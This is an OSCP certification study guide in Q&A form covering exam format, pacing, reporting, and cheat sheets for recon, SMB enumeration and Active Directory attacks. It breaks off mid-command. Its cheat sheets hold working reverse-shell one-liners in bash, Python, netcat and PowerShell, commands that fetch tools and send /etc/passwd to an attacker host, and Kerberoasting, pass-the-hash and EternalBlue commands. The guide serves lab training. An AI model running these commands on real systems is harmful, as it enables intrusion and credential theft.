# SECURITY INTERVIEW PREP - OSCP EXAM PREP
# Offensive Security Certified Professional - (Q1-50)
## Jagdeep Singh | OSCP+ Preparation

---

## SECTION A: EXAM STRUCTURE & METHODOLOGY (Q1-15)

### Q1: What is the OSCP exam structure (2024+ format)?
**A:**

**OSCP+ exam (current format):**

- **24 hours hands-on lab** + 24 hours report
- **100 points total**, need **70 to pass**
- **6 machines** in two sets:

**Active Directory Set (40 points):**
- 3 connected machines forming AD environment
- All 3 must be compromised for full 40 points
- Partial credit limited - usually 10 points for foothold, full 40 for DA
- Starting point given, need to chain through to DA

**Standalone Machines (60 points):**
- 3 individual machines
- 20 points each (10 user, 10 root/SYSTEM)
- No connections between them
- Each is independent

**Bonus points:** 10 points if you complete 80% of course exercises and submit lab report (not applicable to OSCP+, only OSCP).

**Passing strategies:**
- Complete AD (40) + 2 standalone full (40) = 80 ✓ (pass)
- Complete AD (40) + 1 full + 2 user-only (40) = 80 ✓
- AD foothold (10) + 3 standalone full (60) = 70 ✓ (just pass)

**Time allocation suggestion:**
- Hours 0-2: Recon all machines
- Hours 2-10: Tackle AD (highest value)
- Hours 10-16: Standalone machines
- Hours 16-20: Stuck machine attempts
- Hours 20-24: Sleep / buffer / screenshots
- Hours 24-48: Report writing

### Q2: What's different about OSCP+ vs old OSCP?
**A:**

**OSCP+ (current, 2024+):**
- No buffer overflow on exam
- 3-machine AD set added
- Lab time changed (90 days standard)
- Continuing education requirement (renewable cert)
- Updated to reflect modern pentesting

**Old OSCP (pre-2023):**
- Buffer overflow worth 25 points
- 4-5 standalone machines
- One-time cert (no renewal)
- No mandatory AD chain

**Why the change:**
- BOF rarely seen in real engagements
- AD attacks dominate modern pentests
- More relevant to current job market

**Bonus point system:**
- OSCP+ doesn't offer bonus points
- OSCP (legacy) does for lab work

**Renewal:**
- OSCP+: Requires 90 continuing education credits every 3 years
- OSCP (legacy): Lifetime cert

For your career timing: OSCP+ is the version available now. Plan accordingly.

### Q3: What's the OSCP methodology / general approach?
**A:**

**Standard methodology:**

**1. Reconnaissance:**
- Port scan (nmap)
- Service enumeration
- Version detection
- OS fingerprinting

**2. Enumeration:**
- Detailed service interrogation
- Web app discovery
- SMB shares, FTP listings
- LDAP, SNMP queries

**3. Vulnerability identification:**
- Match versions to CVEs
- Test for misconfigurations
- Common default credentials
- Web app vulnerabilities

**4. Exploitation:**
- Initial foothold (user-level)
- Stable shell
- Persistence consideration

**5. Privilege escalation:**
- Local enumeration
- Identify vectors
- Exploit to root/SYSTEM

**6. Post-exploitation:**
- Loot collection
- Pivoting (in AD set)
- Lateral movement

**7. Documentation:**
- Screenshots of EVERY step
- Commands recorded
- proof.txt and local.txt values

**Standard tools per phase:**

Recon:
- nmap, masscan, rustscan

Enumeration:
- nikto, gobuster/feroxbuster/ffuf
- enum4linux, smbclient, smbmap
- ldapsearch

Exploitation:
- searchsploit, exploit-db
- Custom scripts
- Metasploit (limited use on OSCP)

Privesc:
- linpeas.sh, winpeas.exe
- LinEnum.sh
- PowerUp.ps1

### Q4: What are OSCP rules and restrictions?
**A:**

**Allowed:**
- All tools except listed restrictions
- Custom scripts (yours or modified)
- Public exploits (modified is fine)
- Manual exploitation
- Metasploit on ONE machine only

**Restricted:**

**Metasploit limitations:**
- Can use full Metasploit on ONE machine only (your choice)
- That includes: msfvenom, multi/handler, post modules
- After that one machine, you're limited to:
  - msfvenom only (for payload generation)
  - Or no metasploit at all

**Banned:**
- Commercial tools (Cobalt Strike, Burp Pro is debatable)
- Automated vulnerability scanners (Nessus, OpenVAS, etc.)
- SQLMap (in some versions of rules - check current)
- Spawning multiple agents
- Targeting exam infrastructure
- Communicating with others

**Prohibited actions:**
- Attacking proctor or exam systems
- Modifying machine outside intended exploitation
- Bridging networks
- DoS attacks
- Brute forcing user passwords (target accounts, not the OS)

**Required:**
- Webcam on during exam
- Microphone on
- ID verification
- Single screen visible
- No phone use
- No outside communication

**Documentation requirements:**
- Screenshots showing exploitation
- Screenshots of proof.txt
- Screenshots of local.txt
- Network/IP info in screenshot
- Step-by-step reproduction

Read the official current restrictions document before exam - they update.

### Q5: How to pace yourself in 24-hour exam?
**A:**

**Recommended pacing:**

**Hours 0-1: Initial recon ALL machines**
- Run nmap on all 6 IPs in parallel
- Quick port scans
- Identify "easy" targets vs hard

**Hours 1-3: Pick best starting target**
- Usually AD chain start
- Or whichever has clear vulnerability

**Hours 3-8: Push to first big win**
- Goal: 30-40 points by hour 8
- Either AD chain progress or 2 standalones

**Hours 8-12: Reach passing threshold**
- Goal: 70 points by hour 12
- This gives sleep room

**Hours 12-16: Sleep (CRITICAL)**
- 4-6 hours rest
- Sets up clear-headed final push
- Skipping sleep = exam failure for many

**Hours 16-20: Wake up, fresh attempts**
- Tackle remaining machines
- New perspective on stuck items
- Try alternative attack paths

**Hours 20-23: Final push**
- Maximum points possible
- Don't break working things
- Triple-check screenshots

**Hours 23-24: Cleanup and verify**
- Verify all screenshots clear
- Note all credentials
- Save proof.txt values

**Hours 24-48: Report writing**
- Don't rush
- Use template
- Verify reproducibility from your notes

**Critical mindset:**
- 70 points = pass = success
- Don't be greedy
- Don't chase 100 points if you have 70 secured
- Verify before moving on

**Common failure mode:** Skipping sleep, making errors at hour 18, dropping below 70.

### Q6: Note-taking and screenshot strategy
**A:**

**Tools to use:**

**1. CherryTree / Obsidian / Joplin** - structured notes
- Per-machine page
- Phase-based subpages
- Embed screenshots

**2. Greenshot / Flameshot** - screenshot tool
- Annotate as you screenshot
- Quick keyboard shortcuts

**3. tmux + asciinema** - record terminal
- Backup if screenshots fail
- Reviewable timeline

**Template per machine:**

```
## Machine: 10.10.10.5

### Recon
- nmap output [screenshot]
- Services identified

### Enumeration
- Web: gobuster results [screenshot]
- SMB: shares listed [screenshot]
- Versions noted

### Vulnerability Found
- Service: vsftpd 2.3.4
- CVE: CVE-2011-2523
- Type: Backdoor

### Exploitation
- Command used: [screenshot of command + output]
- Initial shell as: ftp [screenshot of whoami]
- local.txt content: [screenshot]

### Privilege Escalation
- Enumeration: linpeas.sh output [screenshot]
- Vector identified: SUID on /usr/bin/find
- Exploit: find / -exec /bin/sh \; -quit
- Root shell: [screenshot]
- proof.txt: [screenshot of cat /root/proof.txt with IP visible]

### Credentials Found
- User: root
- Password: (none, used SUID)
```

**Critical screenshots needed:**

1. ip addr or ifconfig (your IP visible)
2. Each successful command
3. local.txt content
4. proof.txt content
5. Privilege confirmation (whoami showing root/SYSTEM)
6. AD: each domain user used

**Screenshot tips:**

- Full terminal visible
- IP address shown
- Date/time
- Don't crop too tight
- Multiple per major step

**Backup strategy:**

- Save to local drive
- Sync to attached USB
- VPN to cloud backup
- Multiple copies during exam

If screenshots lost = points lost.

### Q7: OSCP report structure
**A:**

**Required report sections:**

```markdown
# OSCP Exam Report
## Name: [Your Name]
## OSID: OS-XXXXX
## Date: [Date]

## High-Level Summary

Brief 1-paragraph overview of engagement.

## Methodology

Approach used for engagement.

## Compromised Hosts

### Host 1: 10.10.10.5

#### Service Enumeration
[Nmap output]

#### Vulnerability Identified
[Vulnerability details]

#### Exploitation
[Step-by-step with screenshots]

#### Privilege Escalation
[Step-by-step]

#### Proof
local.txt: [content]
proof.txt: [content]
Screenshots: [embedded]

### Host 2: [Similar structure]

...

## Active Directory Compromise

### Initial Access
[How you got first foothold]

### Lateral Movement
[How you moved between machines]

### Privilege Escalation
[Path to Domain Admin]

### Final Compromise
[Screenshot of DA access]

## Appendix: Commands Used

[List of commands for reference]
```

**Report requirements:**

- PDF format
- Clear formatting
- Screenshots embedded (not linked)
- Step-by-step reproduction
- Anyone should be able to reproduce
- No copy-paste of generic exploits without context
- Original work

**Common report failures:**

1. Unclear screenshots
2. Missing proof.txt screenshots
3. Steps not reproducible
4. Missing AD chain documentation
5. Generic write-ups without specifics
6. Format issues (broken images)

**Template tools:**
- Offensive Security provides template
- Markdown → PDF (pandoc)
- Or use their official Word template

**Time investment:**
- 6-12 hours for report
- Don't skimp
- Quality matters

### Q8: What if you get stuck during exam?
**A:**

**Stuck protocol:**

**Step 1: Identify what's blocking (5 min)**
- Stuck on enumeration?
- Stuck on exploitation?
- Stuck on privesc?

**Step 2: Try different angle (15 min)**
- Re-run enumeration with different tools
- Different exploit attempts
- Read the exploit code more carefully

**Step 3: Switch machines (immediate)**
- 30 minutes max per stuck point
- Move to different machine
- Come back fresh

**Step 4: Walk away (5-10 min)**
- Bathroom break
- Snack
- Stretch
- Reset mind

**Step 5: Re-read everything**
- Initial nmap output
- Service banners
- Web page sources
- Error messages
- Look for missed details

**Step 6: Test assumptions**
- Are you sure that service is what banner says?
- Is web app actually behind that port?
- Did you check all directories?

**Common stuck patterns:**

**1. "Exploit doesn't work":**
- Wrong version? Verify.
- Need to modify? Read code.
- Different platform? Check arch.

**2. "Can't find foothold":**
- Missed enumeration step
- Try uncommon ports
- Check UDP services
- Re-check web app thoroughly

**3. "Can't escalate":**
- Run multiple enumeration scripts
- Check kernel version vs exploits
- Look at running processes
- Cron jobs
- Sudo permissions
- Capabilities
- SUID/SGID files
- World-writable files

**4. "AD chain broken":**
- Lost foothold somehow
- Credentials don't work where expected
- Re-verify everything

**Things that help:**

- Eat regularly
- Water (not too much energy drinks)
- Walking breaks
- Don't stare at terminal for 4 hours straight
- Sleep when needed (12-hour mark)

**Don't do:**

- Panic
- Give up
- Skip screenshots when stuck (still document attempts)
- Spend 4+ hours on single machine
- Stay up entire 24 hours

### Q9: Difference between trying harder and being stuck
**A:**

**"Try Harder" myth:**

OffSec's motto has evolved. Modern interpretation:
- Don't give up too easily
- Think creatively
- Persist through frustration
- But ALSO know when to move on

**Productive struggling:**

- Trying multiple approaches
- Reading documentation
- Re-examining enumeration
- Testing different payloads
- Learning new techniques

**Unproductive struggling (stop and move on):**

- Trying same thing repeatedly
- Frustrated, making errors
- Tunnel vision
- Refusing to read hints in environment
- Ego-driven persistence

**The 30-90 minute rule:**

If you've been stuck on one phase for 30-90 minutes:
1. Switch machines
2. Come back with fresh eyes
3. Often solution becomes obvious

**The "rubber duck" method:**

Explain problem out loud:
- Often clarifies thinking
- Reveals overlooked details
- Yes, talk to yourself - it works

**Knowing when to truly try harder:**

- You see a partial path
- Exploit code needs minor tweaks
- Output suggests something specific
- Pattern matches known technique

**Knowing when to move on:**

- Completely stuck for 90+ minutes
- No new ideas to try
- Frustration affecting judgment
- Other machines may be faster

**Sleep is essential to "try harder":**

Tired brain ≠ trying harder. It's just being stubborn while exhausted.

After sleep, you might solve in 5 minutes what took 5 hours awake.

### Q10: Common OSCP exam mistakes
**A:**

**Top 15 mistakes:**

**1. Not enumerating enough:**
- Spending 2 hours trying exploits on something that wasn't even vulnerable
- 80% recon, 20% exploitation

**2. Sleep deprivation:**
- Trying to "push through 24 hours"
- Errors compound

**3. Bad screenshots:**
- Can't read terminal
- IP not visible
- Half cut off

**4. Lost credentials:**
- Cracked password, forgot to save
- Found cred, lost track

**5. Metasploit on wrong machine:**
- Used MSF on easy machine
- Hit harder machine that needed MSF, can't use

**6. Tunnel vision:**
- 6 hours on one machine
- Other machines untouched

**7. Not using AD course material:**
- Skip AD modules in PEN-200
- Exam has 40-point AD chain you can't do

**8. Ignoring proof.txt format:**
- Don't include IP address in screenshot
- proof not accepted

**9. Not testing reproducibility:**
- Steps in notes don't actually work
- Can't write report

**10. Trying complex when simple works:**
- Custom exploit attempts when default creds work
- Searchsploit > zero-day

**11. Not reading exam materials:**
- Miss hints in scenario
- Miss restrictions update

**12. Network/VPN issues:**
- VPN drops at hour 14
- Connection unstable
- Lose progress

**13. Forgetting to document while exploiting:**
- "I'll write this up later" → forgotten by report time

**14. Submitting report too quickly:**
- Errors not caught
- Missing screenshots
- Format issues

**15. Not eating/hydrating:**
- Skipped meals = brain fog
- 24 hours without food = bad decisions

**Pre-exam preparation:**

- Eat well day before
- Sleep well night before
- Snacks ready
- Water bottle
- Notes template ready
- Tools tested
- Internet backup option

### Q11: Useful exam day setup
**A:**

**Hardware setup:**

- Wired ethernet (not wifi)
- UPS for power outage
- Comfortable chair
- Good monitor
- Backup phone hotspot (in case wifi dies)

**Software setup:**

**Kali Linux VM (or native):**
- Updated tools
- Pre-configured tmux/screen
- Wordlists ready
- Custom scripts saved
- Exploits downloaded

**Note-taking app:**
- CherryTree / Obsidian opened
- Template per machine ready
- Auto-save enabled

**Screenshot tool:**
- Greenshot/Flameshot ready
- Keyboard shortcut tested

**Browser:**
- Burp Suite Community ready
- ExploitDB bookmarked
- Common references

**Terminal multiplexer:**
```bash
# tmux config
# Split screen for multiple machines
tmux new-session -d -s exam
tmux split-window -h
tmux split-window -v
```

**Pre-loaded wordlists:**
- /usr/share/wordlists/
- rockyou.txt
- SecLists collection
- Custom wordlists

**Pre-loaded scripts:**
- linpeas.sh
- winpeas.exe  
- linEnum.sh
- PowerUp.ps1
- pspy
- Static binaries (busybox, socat, nc)

**Reverse shell generators:**
- revshells.com bookmarked
- Or local payloadsallthethings
- Different platforms ready

**Notes before exam:**

Common commands cheat sheet:
```bash
# Recon
nmap -sCV -p- -T4 -oA full $IP
nmap -sU --top-ports 200 -oA udp $IP

# Web
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt
feroxbuster -u http://$IP -w /usr/share/wordlists/dirb/big.txt

# SMB
enum4linux -a $IP
smbmap -H $IP
smbclient -L //$IP

# Privesc
wget http://my_ip/linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh
```

Have these ready, not searching mid-exam.

### Q12: Lab preparation strategy
**A:**

**90-day lab access strategy:**

**Days 1-15: Foundation**
- Complete course materials
- Watch all videos
- Read PDF thoroughly
- Practice all exercises
- Get comfortable with environment

**Days 15-45: Lab machines**
- Target 40-50 machines
- Focus on AD machines first (priority for exam)
- Don't speedrun - take notes
- Use as learning opportunity

**Days 45-75: Difficult machines**
- Harder ones: Sufferance, Pain, Humble
- Use hints when truly stuck
- Multiple attack vectors per machine

**Days 75-90: Practice exams**
- Take mock exam (24 hours)
- Stick to time limits
- Practice reporting
- Identify weak areas

**Machines to definitely do:**

PEN-200 lab classic difficulty levels:
- 25+ easy/medium
- 10+ AD machines
- 5+ hard machines
- Multiple privesc patterns

**Supplementary resources:**

**1. HackTheBox:**
- Active Directory machines (post-2023)
- TJNull's OSCP-like list (updated regularly)
- Pro Labs: Dante for general, Cybernetics for AD

**2. TryHackMe (your existing access):**
- Offensive Pentesting path
- Active Directory rooms
- Cyber Defense path (helps with detection awareness)
- Wreath network

**3. Proving Grounds:**
- OffSec's lab platform
- Practice machines
- Closest to exam style
- Subscription required

**4. VulnHub:**
- Free downloadable VMs
- Some OSCP-like
- Practice in isolated environment

**Your existing plan (3 months):**
- Month 1: TryHackMe/Proving Grounds gap-fill (Linux privesc focus per memory)
- Month 2: PEN-200 official course
- Month 3: OSCP A/B/C mock exams
- Target: 80-100 machines total before exam

This is solid. Stick to it.

### Q13: OSCP cheatsheet essentials
**A:**

**Must-have commands memorized:**

**Nmap:**
```bash
# Quick top ports
nmap -sCV --top-ports 1000 -oA quick $IP

# Full TCP
nmap -sCV -p- -T4 -oA full $IP

# UDP top 200
nmap -sU --top-ports 200 -oA udp $IP

# Aggressive
nmap -A -T4 -p- $IP
```

**Web enumeration:**
```bash
# Directory bruteforce
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt

# Subdomain
gobuster dns -d $DOMAIN -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# Fast alternative
feroxbuster -u http://$IP -w /usr/share/wordlists/dirb/big.txt

# Nikto
nikto -h http://$IP

# Source code check
curl -s http://$IP | grep -E "comment|password|api|key"
```

**SMB enumeration:**
```bash
# Comprehensive
enum4linux -a $IP

# List shares
smbmap -H $IP
smbclient -L //$IP -N

# Connect to share
smbclient //$IP/share -N

# Mount share
mount -t cifs //$IP/share /mnt/share -o username=,password=
```

**SNMP enumeration:**
```bash
# With community string
snmpwalk -v 2c -c public $IP
snmp-check -t $IP
onesixtyone -c communities.txt $IP
```

**LDAP:**
```bash
ldapsearch -x -H ldap://$IP -b "dc=example,dc=com"
ldapsearch -x -H ldap://$IP -s base namingcontexts
```

**Reverse shells:**

Bash:
```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'
```

Python:
```python
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.1",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

Netcat (without -e):
```bash
mkfifo /tmp/f; nc 10.10.14.1 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1
```

PowerShell:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

**Stabilizing shells:**

```bash
# After getting shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Then in shell:
export TERM=xterm
# Ctrl+Z to background
stty raw -echo; fg

# Or one-liner
script /dev/null -c bash
```

**File transfer:**

To target (HTTP):
```bash
# On attacker
python3 -m http.server 80

# On target (Linux)
wget http://10.10.14.1/file
curl -O http://10.10.14.1/file

# On target (Windows)
certutil -urlcache -split -f http://10.10.14.1/file.exe c:\temp\file.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.14.1/file.exe','C:\temp\file.exe')"
```

From target:
```bash
# Attacker
nc -lvnp 9001 > exfil.txt

# Target
cat /etc/passwd | nc 10.10.14.1 9001

# Or scp / sftp if SSH available
```

### Q14: Common ports and services to remember
**A:**

**Critical ports for OSCP:**

```
21      FTP - Anonymous access, version exploits
22      SSH - Brute force, key auth issues
23      Telnet - Cleartext, default creds
25      SMTP - User enumeration (VRFY/EXPN)
53      DNS - Zone transfers, subdomain discovery
80      HTTP - Web app testing primary
88      Kerberos - AD attacks
110     POP3 - Cleartext auth
111     RPC - Linux services enumeration
135     RPC - Windows services
139     NetBIOS - SMB legacy
143     IMAP - Cleartext auth
161     SNMP - Community strings (public/private)
389     LDAP - AD enumeration
443     HTTPS - Web app testing
445     SMB - Critical for AD attacks
587     SMTP submission - Auth services
636     LDAPS - Encrypted LDAP
873     rsync - Sometimes exposed
1099    Java RMI - Exploitation surface
1433    MSSQL - Database access
1521    Oracle DB
2049    NFS - Shared filesystem
2222    Alt SSH
2375    Docker API - RCE if unauth
3000    Common dev servers (Grafana)
3128    Squid proxy
3306    MySQL
3389    RDP - Windows remote access
3690    SVN
4369    Erlang
5000    Common dev (Flask)
5432    PostgreSQL
5433    Alt PostgreSQL
5601    Kibana
5800    VNC web
5900    VNC
5984    CouchDB
5985    WinRM HTTP
5986    WinRM HTTPS
6379    Redis - Often unauth
6443    Kubernetes API
7474    Neo4j
8000    Common web alt
8080    Common web alt (Tomcat, etc.)
8081    Alt web
8443    Alt HTTPS
8888    Common web
9000    Common web
9001    Tor
9090    Cockpit, Prometheus
9092    Kafka
9200    Elasticsearch
9418    Git
10000   Webmin
11211   Memcached
27017   MongoDB
```

**Quick wins per port:**

**21 (FTP):**
```bash
ftp $IP
# Try: anonymous / anonymous
ls -la
# Look for: backup files, config files, ssh keys
```

**22 (SSH):**
```bash
ssh root@$IP
# Try: default creds
# Check version banner for vulns
```

**80/443 (HTTP):**
```bash
# Always thorough enum
gobuster dir -u http://$IP -w wordlist
nikto -h http://$IP
whatweb http://$IP
```

**139/445 (SMB):**
```bash
enum4linux -a $IP
smbmap -H $IP
# Null session test
smbclient -L //$IP -N
```

**3306 (MySQL):**
```bash
mysql -h $IP -u root
# Try: root/root, root/(blank)
```

**6379 (Redis):**
```bash
redis-cli -h $IP
# Often unauth
# Check for RCE: CONFIG SET dir, CONFIG SET dbfilename, SET key value, SAVE
```

### Q15: Active Directory attack flow for OSCP
**A:**

**OSCP AD chain typical:**

**Starting point:** Initial credentials provided OR foothold via web exploit

**Phase 1: Initial enumeration**

```powershell
# Once on initial host
whoami /all
whoami /priv
systeminfo
ipconfig /all

# Domain info
net user /domain
net group /domain
net group "Domain Admins" /domain
```

**Phase 2: Domain enumeration**

```powershell
# PowerView
. .\PowerView.ps1

# Or AD module
Import-Module ActiveDirectory

Get-DomainUser
Get-DomainComputer
Get-DomainGroup
Get-DomainGroupMember "Domain Admins"

# SPN accounts
Get-DomainUser -SPN

# ASREP-roastable
Get-DomainUser -PreauthNotRequired
```

**Phase 3: Find attack path**

```powershell
# Run SharpHound
.\SharpHound.exe -CollectionMethod All

# Or from Linux
bloodhound-python -c All -u user -p password -d domain.local -ns DC_IP
```

Import into BloodHound. Look for shortest path to Domain Admins.

**Phase 4: Common OSCP AD attacks**

**Kerberoasting:**
```bash
GetUserSPNs.py domain.local/user:password -dc-ip $DC_IP -request -outputfile hash.txt
hashcat -m 13100 hash.txt rockyou.txt
```

**AS-REP roasting:**
```bash
GetNPUsers.py domain.local/ -no-pass -usersfile users.txt -dc-ip $DC_IP -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
```

**ACL abuse (BloodHound shows):**
```powershell
# GenericAll on user → password reset
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString "NewP@ss123!" -AsPlainText -Force)

# GenericWrite on user → add SPN, kerberoast
Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/spn'}
```

**Pass-the-Hash:**
```bash
crackmapexec smb $IP_RANGE -u user -H NTHASH
psexec.py -hashes :NTHASH domain/user@target
```

**Phase 5: Domain Admin to all 3 machines**

Once DA:
- Login to all 3 AD machines via WinRM/PsExec
- Get proof.txt from each
- Document each access

**Common OSCP AD chains:**

**Chain 1:**
- Foothold via web on Machine 1
- PrintNightmare / SeImpersonate → local SYSTEM
- Mimikatz → user hashes
- Kerberoast → service account credentials
- Service account has admin on Machine 2
- WinRM to Machine 2 → local admin
- Find DA token in memory → impersonation
- DCSync from Machine 3 (DC)

**Chain 2:**
- ASREP-roast given user → crack password
- BloodHound: GenericWrite on group → add to admin group
- Now admin on Machine 2
- Credential dump → DA password reuse
- DC compromise

**Tools to have ready for AD:**

- PowerView.ps1
- SharpHound.exe / bloodhound-python
- Rubeus.exe
- mimikatz.exe (or pypykatz)
- impacket suite
- crackmapexec
- evil-winrm

---

## SECTION B: RECONNAISSANCE & ENUMERATION (Q16-30)

### Q16: Comprehensive nmap usage for OSCP
**A:**

**Scan progression:**

**Stage 1: Quick discovery**
```bash
# Fast initial scan
nmap -F -T4 $IP
nmap --top-ports 100 -T4 $IP
```

Get quick picture of what's open.

**Stage 2: Full TCP scan**
```bash
# All TCP ports - takes longer
nmap -p- -T4 -oA full_tcp $IP

# With scripts and version detection
nmap -p- -sCV -T4 -oA full $IP
```

**Stage 3: UDP scan**
```bash
# Top UDP ports (full UDP scan very slow)
nmap -sU --top-ports 200 -T4 $IP

# Don't skip UDP - SNMP, DNS, NTP, etc. matter
```

**Stage 4: Targeted scans on found ports**
```bash
# After finding open ports
nmap -p 22,80,445 -sCV -A $IP

# Specific scripts
nmap -p 445 --script smb-vuln* $IP
nmap -p 80 --script http-enum $IP
```

**Useful flags:**

```bash
-sS        # SYN scan (default, fast)
-sT        # TCP connect scan (no root needed)
-sU        # UDP scan
-sV        # Version detection
-sC        # Default scripts
-A         # Aggressive (-sV -sC -O --traceroute)
-O         # OS detection
-T0-T5     # Timing (T4 usually fine)
-p-        # All ports
-p 1-65535 # Same as above
-oA name   # Output all formats (xml, normal, gnmap)
-Pn        # Skip ping (treat as up)
-n         # No DNS resolution
--top-ports N  # Top N most common
--reason   # Show why port is open/closed
-vv        # Very verbose
--open     # Only show open ports
```

**Stealth scanning (less relevant for OSCP):**

```bash
# Slower but quieter
nmap -sS -T2 -f --data-length 30 $IP

# Decoys
nmap -D RND:10 $IP
```

**NSE scripts useful for OSCP:**

```bash
# Discovery scripts
nmap --script discovery $IP

# Vulnerability scripts
nmap --script vuln $IP

# SMB-specific
nmap --script smb-os-discovery,smb-enum-shares,smb-enum-users -p 445 $IP

# HTTP-specific
nmap --script http-enum,http-headers,http-methods -p 80,443 $IP

# All common service scripts
nmap --script "default,discovery,vuln" $IP
```

**Avoiding nmap mistakes:**

1. **Don't skip UDP** - SNMP, DNS, NFS critical
2. **Always scan -p-** - Services on weird ports
3. **Use -sCV** - Version + scripts together
4. **Save output** - -oA name for later reference
5. **Check all interfaces** - Multiple network cards possible

**Time savings:**

```bash
# Run quick scan and full scan in parallel
nmap -F -T4 $IP &
nmap -p- -T4 $IP > full.txt &
nmap -sU --top-ports 200 $IP > udp.txt &
wait
```

### Q17: Web enumeration deep dive
**A:**

**Initial fingerprinting:**

```bash
# What technology
whatweb http://$IP
whatweb -a 3 http://$IP

# HTTP headers
curl -I http://$IP
curl -v http://$IP

# Wappalyzer browser extension
# Visit site, see tech stack
```

**Directory bruteforcing:**

**gobuster (popular):**
```bash
# Basic
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt

# Better wordlist
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# With extensions
gobuster dir -u http://$IP -w wordlist -x php,html,txt,bak,old

# Threads
gobuster dir -u http://$IP -w wordlist -t 50

# Status codes
gobuster dir -u http://$IP -w wordlist -s "200,204,301,302,307,401,403"
```

**feroxbuster (faster):**
```bash
# Recursive by default
feroxbuster -u http://$IP

# With wordlist
feroxbuster -u http://$IP -w /usr/share/wordlists/dirb/big.txt

# Filter responses
feroxbuster -u http://$IP -C 404 -C 401
```

**ffuf (most flexible):**
```bash
# Directory bruteforce
ffuf -w /usr/share/wordlists/dirb/big.txt -u http://$IP/FUZZ

# Parameter discovery
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u "http://$IP/page.php?FUZZ=test" -fs 1234

# Subdomain
ffuf -w /usr/share/wordlists/subdomains.txt -u http://DOMAIN -H "Host: FUZZ.DOMAIN" -fs 1234
```

**Wordlists to know:**

```
/usr/share/wordlists/dirb/
├── big.txt              # 20K entries
├── common.txt           # 4.6K entries  
└── small.txt            # Tiny

/usr/share/wordlists/dirbuster/
├── directory-list-2.3-medium.txt   # 220K entries
├── directory-list-2.3-small.txt    # 87K entries
└── directory-list-1.0.txt          # 142K entries

/usr/share/wordlists/SecLists/
├── Discovery/Web-Content/
│   ├── common.txt
│   ├── raft-large-words.txt
│   └── ...
└── ... (many)
```

**Source code inspection:**

```bash
# View source
view-source:http://$IP

# Check robots.txt
curl http://$IP/robots.txt

# Check sitemap
curl http://$IP/sitemap.xml

# Check common files
for file in .git/HEAD .env .htaccess web.config admin.php config.php; do
    curl -s -o /dev/null -w "%{http_code} $file\n" http://$IP/$file
done
```

**Common vulnerable paths:**

```
/admin
/admin.php
/admin/login
/login
/login.php
/wp-admin
/wp-login.php
/phpmyadmin
/manager/html (Tomcat)
/console
/jenkins
/.git
/.env
/backup
/backups
/.svn
```

**Web application fingerprinting:**

```bash
# wafw00f (WAF detection)
wafw00f http://$IP

# whatweb deep scan
whatweb -a 3 http://$IP

# Manual: check Cookie names, header values, error pages, /robots.txt
```

**Test for known vulnerabilities:**

```bash
# nikto
nikto -h http://$IP

# More comprehensive
nikto -h http://$IP -Format html -output nikto.html
```

### Q18: SMB enumeration techniques
**A:**

**SMB enumeration progression:**

**Stage 1: Initial check**
```bash
# Quick OS info
nmap -p 445 --script smb-os-discovery $IP

# Output shows:
# OS, computer name, domain, workgroup, etc.
```

**Stage 2: Comprehensive**
```bash
# enum4linux (classic)
enum4linux -a $IP

# enum4linux-ng (modern)
enum4linux-ng -A $IP

# Shows:
# - Workgroup/Domain
# - Users (RID brute)
# - Groups
# - Shares
# - Password policy
# - Sessions
```

**Stage 3: Share enumeration**
```bash
# List shares
smbmap -H $IP

# Or with credentials
smbmap -H $IP -u user -p password

# Specific share contents
smbmap -H $IP -r 'share_name'

# Recursive
smbmap -H $IP -R 'share_name'

# Search for files
smbmap -H $IP -R --search '.*config.*'
```

**Stage 4: Direct access**
```bash
# List shares
smbclient -L //$IP -N
smbclient -L //$IP -U user

# Connect to share
smbclient //$IP/share -N
smbclient //$IP/share -U user

# Once connected:
ls
get filename
put filename
mget *
recurse on
mget *
```

**Mount share:**
```bash
mkdir /mnt/share
mount -t cifs //$IP/share /mnt/share -o username=,password=
# Or for anonymous
mount -t cifs //$IP/share /mnt/share -o username=guest,password=
```

**Null sessions (anonymous):**
```bash
# Try without credentials
smbclient //$IP/share -N
rpcclient -U "" -N $IP

# Inside rpcclient:
> enumdomusers
> enumdomgroups
> queryuser 0x1f4   # User RID
> querygroup 0x200   # Group RID
> srvinfo
> netshareenum
```

**SMB version exploitation:**
```bash
# Check for vulns
nmap -p 445 --script smb-vuln-* $IP

# Common SMB vulns:
# - MS17-010 (EternalBlue)
# - MS08-067 (Conficker)
# - SambaCry (CVE-2017-7494)
```

**EternalBlue (MS17-010):**
```bash
# Check
nmap -p 445 --script smb-vuln-ms17-010 $IP

# Exploit (if vulnerable)
# In Metasploit:
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $IP
exploit

# Or use AutoBlue from GitHub for manual exploitation
```

**RPC enumeration:**
```bash
rpcclient -U "" -N $IP
> queryuser 0x3e8
> netshareenum
> netshareenumall
> srvinfo
> enumdomusers
> getdompwinfo  # Password policy
```

**User RID cycling:**
```bash
# Even without enumeration, try sequential RIDs
for i in $(seq 1000 1020); do
